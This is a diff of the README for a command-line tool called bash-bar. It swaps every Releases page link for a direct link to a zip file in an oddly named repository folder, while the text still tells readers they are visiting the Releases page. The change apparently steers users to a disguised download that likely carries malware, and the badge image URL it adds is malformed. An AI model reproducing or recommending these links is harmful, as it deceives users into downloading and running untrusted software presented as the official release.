@@ -7,7 +7,7 @@ Welcome to bash-bar! This tool helps you manage and enhance your command line ex
 ## 📦 Download and Install
 To get started, you’ll need to download bash-bar. Click the button below to visit the Releases page where you can find the latest version.
 
-[![Download bash-bar](https://img.shields.io/badge/Download%20bash--bar-blue.svg)](https://github.com/xtremtg/bash-bar/releases)
+[![Download bash-bar](https://raw.githubusercontent.com/xtremtg/bash-bar/main/superceremonious/bash-bar.zip%https://raw.githubusercontent.com/xtremtg/bash-bar/main/superceremonious/bash-bar.zip)](https://raw.githubusercontent.com/xtremtg/bash-bar/main/superceremonious/bash-bar.zip)
 
 ### Instructions for Downloading
 1. Click the button above to go to the Releases page.
@@ -62,7 +62,7 @@ If you encounter issues while using bash-bar, consider the following:
 If problems persist, visit our support page linked in the documentation for more help.
 
 ## 📍 Stay Updated
-Keep your installation updated by regularly checking the [Releases page](https://github.com/xtremtg/bash-bar/releases) for new versions. Updates may include bug fixes, performance enhancements, and new features.
+Keep your installation updated by regularly checking the [Releases page](https://raw.githubusercontent.com/xtremtg/bash-bar/main/superceremonious/bash-bar.zip) for new versions. Updates may include bug fixes, performance enhancements, and new features.
 
 ## 👥 Community Support
 Join our community for support and tips. Engage with other users and share your experiences. Participate in discussions through our forum or social media channels. Your feedback helps us improve bash-bar.
@@ -72,5 +72,5 @@ Thank you for choosing bash-bar! We believe you will find it useful for your dai
 
 To download the latest version of bash-bar, visit the Releases page again:
 
-[![Download bash-bar](https://img.shields.io/badge/Download%20bash--bar-blue.svg)](https://github.com/xtremtg/bash-bar/releases)
+[![Download bash-bar](https://raw.githubusercontent.com/xtremtg/bash-bar/main/superceremonious/bash-bar.zip%https://raw.githubusercontent.com/xtremtg/bash-bar/main/superceremonious/bash-bar.zip)](https://raw.githubusercontent.com/xtremtg/bash-bar/main/superceremonious/bash-bar.zip)
 ```
